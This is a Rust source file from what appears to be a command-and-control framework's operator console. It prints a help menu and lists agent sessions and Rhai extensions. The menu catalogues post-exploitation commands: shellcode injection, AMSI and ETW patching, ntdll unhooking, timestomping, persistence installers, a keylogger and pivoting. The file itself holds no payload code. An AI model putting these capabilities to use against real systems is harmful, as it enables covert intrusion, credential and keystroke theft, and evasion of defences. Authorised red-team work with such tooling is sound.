// ./src/menu/ui.rs
use crate::common::SharedSessions;
use std::fs;

pub fn print_help() {
    eprintln!("\n=== Help ===");
    eprintln!(" Menu (global):");
    eprintln!("   sessions                              - List active sessions");
    eprintln!("   interact <id>                         - Enter session mode");
    eprintln!("   help                                  - Show this help");
    eprintln!("   exit / quit                           - Shutdown server (graceful)");
    eprintln!(" Menu (in-session):");
    eprintln!("   background / bg                       - Return to global menu");
    eprintln!("   proxy start / proxy stop              - SOCKS5 proxy through the agent (random ports)");
    eprintln!("   proxy list                            - List active proxies (shared with the panel/API)");
    eprintln!("   pivot list / pivot stop <id>          - List the agent's pivot listeners / tear one down");
    eprintln!("   screenshot                            - Capture a screenshot (runs the screenshot extension)");
    eprintln!("   extension list                        - List extensions in ./extensions");
    eprintln!("   extension load <name> [args...]       - Load a Rhai extension; file args are auto-uploaded");
    eprintln!("   upload <local> <remote>               - Upload file (remote path is relative to the agent CWD)");
    eprintln!("   download [-r] <remote>                - Download file (-r = recursive)");
    eprintln!("   inject <pid> <file>                   - Inject local shellcode file into a remote process");
    eprintln!(" Anything else typed in session mode is sent to the agent as a command:");
    eprintln!(" Shell & execution:");
    eprintln!("   shell <cmd>  or  !<cmd>               - Run an OS shell command");
    eprintln!("   bg <cmd>                              - Run a shell command as a background job");
    eprintln!("   inmem:pe <b64_pe>                     - Manual-map a PE in memory (Windows)");
    eprintln!("   inmem:bof <b64_coff> [b64_args]       - Run a COFF/BOF object (Windows)");
    eprintln!("   inmem:dotnet <path> <Type> <Method> <arg> [runtime] - Host CLR, run assembly (Windows)");
    eprintln!(" Files & artifacts:");
    eprintln!("   fs:ls <path>                          - List directory (JSON output)");
    eprintln!("   timestomp <target> <reference>        - Copy timestamps from a reference file");
    eprintln!("   timestomp:set <path> <epoch>          - Set timestamps to a Unix epoch");
    eprintln!("   secure_delete <path>                  - Overwrite (3x random + zeros) and delete");
    eprintln!("   ads:write <path> <stream> <b64>       - Write an NTFS alternate data stream (Windows)");
    eprintln!("   ads:read <path> <stream>              - Read an ADS (Windows)");
    eprintln!("   ads:list <path>                       - List ADS names (Windows)");
    eprintln!(" Config & mode:");
    eprintln!("   sleep <sec> <jitter_min> <jitter_max> - Set beacon interval and jitter");
    eprintln!("   beacon:mode active|passive            - Switch beacon polling mode (TCP transport)");
    eprintln!("   fallback:config                       - Dump fallback C2 configuration");
    eprintln!("   fallback:push|<b64>                   - Push a new fallback configuration");
    eprintln!(" Jobs:");
    eprintln!("   jobs:list                             - List background jobs");
    eprintln!("   jobs:kill <id>                        - Kill a background job");
    eprintln!("   jobs:purge                            - Purge finished jobs");
    eprintln!(" Network & pivoting:");
    eprintln!("   pivot:listener_tcp <port>             - Listen for downstream pivot agents (TCP)");
    eprintln!("   pivot:listener_smb <pipe>             - Listen for downstream pivot agents (named pipe, Windows)");
    eprintln!("   pivot:list / pivot:stop <id>          - List / stop pivot listeners (menu: pivot list / pivot stop)");
    eprintln!("   rportfwd:start <tport> <host> <port>  - Reverse port forward through the agent");
    eprintln!("   rportfwd:stop <tport>                 - Stop a reverse forward");
    eprintln!("   rportfwd:list                         - List active reverse forwards");
    eprintln!(" Evasion (Windows):");
    eprintln!("   evasion:patch_amsi                    - Patch AMSI in the current process");
    eprintln!("   evasion:patch_etw                     - Patch ETW in the current process");
    eprintln!("   evasion:unhook_ntdll                  - Restore a clean ntdll from disk");
    eprintln!("   evasion:patch_all                     - Run all of the above");
    eprintln!("   evasion:syscall_check                 - Resolve direct/indirect syscall SSNs");
    eprintln!("   evasion:encrypt_heap_aes              - AES-256-GCM encrypt heap blocks");
    eprintln!("   evasion:decrypt_heap_aes              - Decrypt heap blocks");
    eprintln!(" Persistence:");
    eprintln!("   persist:list                          - List installed persistence");
    eprintln!("   persist:cleanup                       - Remove all installed persistence");
    eprintln!("   persist:run <name> <path>             - HKCU Run key (Windows; _remove to undo)");
    eprintln!("   persist:run_hklm <name> <path>        - HKLM Run key (Windows; _remove to undo)");
    eprintln!("   persist:task <name> <path>            - Scheduled task (Windows; _remove to undo)");
    eprintln!("   persist:startup <name> <path>         - Startup folder (Windows; _remove to undo)");
    eprintln!("   persist:systemd <name> <path>         - systemd user service (Linux; _remove to undo)");
    eprintln!("   persist:profile <name> <path>         - Shell profile autostart (Linux; _remove to undo)");
    eprintln!("   persist:launchagent <name> <path>     - LaunchAgent (macOS; _remove to undo)");
    eprintln!("   persist:cron <name> <path>            - Cron job (Linux/macOS; _remove to undo)");
    eprintln!(" Process:");
    eprintln!("   proc:inject <pid> <b64_shellcode>     - Inject shellcode (see 'inject' shortcut)");
    eprintln!("   migrate:spawn <binary>                - Migrate into a new sacrificial process");
    eprintln!("   migrate:inject <pid>                  - Migrate into an existing process");
    eprintln!("   keylogger:start                       - Start background keystroke recording (Windows)");
    eprintln!("   keylogger:dump                        - Retrieve captured keystrokes");
    eprintln!("   keylogger:stop                        - Stop recording and detach hook");
    eprintln!(" Lifecycle:");
    eprintln!("   sys:die                               - Remove persistence and self-destruct the agent");
    eprintln!("");
    eprintln!(" Unknown commands are rejected by the agent; use 'shell <cmd>' or '!<cmd>' for OS commands.");
}

pub fn print_sessions(sessions: &SharedSessions) {
    let map = &*sessions;
    if map.is_empty() { 
        eprintln!("No sessions."); 
        return; 
    }
    eprintln!("ID    | IP Address        | Hostname");
    eprintln!("-----|-------------------|---------");
    for entry in map.iter() {
        eprintln!("{:<4} | {:<16} | {}", entry.key(), entry.value().addr.ip(), entry.value().hostname);
    }
}

pub fn print_extensions() {
    eprintln!("\nAvailable Extensions (./extensions):");
    eprintln!("------------------------------------");
    if let Ok(entries) = fs::read_dir("./extensions") {
        for entry in entries.flatten() {
            if let Ok(name) = entry.file_name().into_string() {
                if name.ends_with(".rhai") {
                    eprintln!(" - {}", name.trim_end_matches(".rhai"));
                }
            }
        }
    } else {
        eprintln!("[-] Could not read ./extensions directory.");
    }
    println!();
}